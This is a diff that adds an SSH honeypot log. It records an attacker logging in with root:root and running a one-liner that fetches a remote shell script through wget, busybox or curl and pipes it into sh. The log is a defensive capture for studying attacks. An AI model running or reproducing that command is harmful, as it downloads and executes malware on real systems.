@@ -1,0 +1,16 @@
+2025-11-27 21:17:20.170 - [Info] MITM Version: 1.4
+2025-11-27 21:17:20.172 - [Info] Auto Access Enabled: true
+2025-11-27 21:17:20.173 - [Debug] [Init] Auto Access Barrier: true
+2025-11-27 21:17:20.178 - [Info] SSH man-in-the-middle server for 172.20.0.5 listening on 0.0.0.0:10004
+2025-11-27 21:30:31.296 - [Debug] [Connection] Attacker connected: 193.32.127.178 | Client Identification: SSH-2.0-paramiko_3.5.1
+2025-11-27 21:30:32.750 - [Debug] [Auth] Attacker 193.32.127.178 trying to authenticate with "password"
+2025-11-27 21:30:32.751 - [Debug] [Auto Access] Attacker: 193.32.127.178, Threshold: 1, Attempts: 1
+2025-11-27 21:30:32.751 - [Debug] [Auto Access] Compromising the honeypot
+2025-11-27 21:30:32.751 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2025-11-27 21:30:33.100 - [Debug] [Auth] Valid credentials - Password Authentication
+2025-11-27 21:30:33.100 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.5
+2025-11-27 21:30:33.164 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2025-11-27 21:30:34.159 - [Debug] [EXEC] Noninteractive mode attacker command: (wget -qO- http://74.194.191.52/rondo.yah.sh||busybox wget -qO- http://74.194.191.52/rondo.yah.sh||curl -s http://74.194.191.52/rondo.yah.sh||good -qO- http://74.194.191.52/rondo.yah.sh)|sh;echo infected;
+2025-11-27 21:30:36.548 - [Debug] [Connection] Attacker closed connection
+2025-11-27 21:30:36.551 - [Debug] [LXC] Container's OpenSSH server ended connection
+2025-11-27 21:30:36.552 - [Debug] [LXC] Container's OpenSSH server closed connection
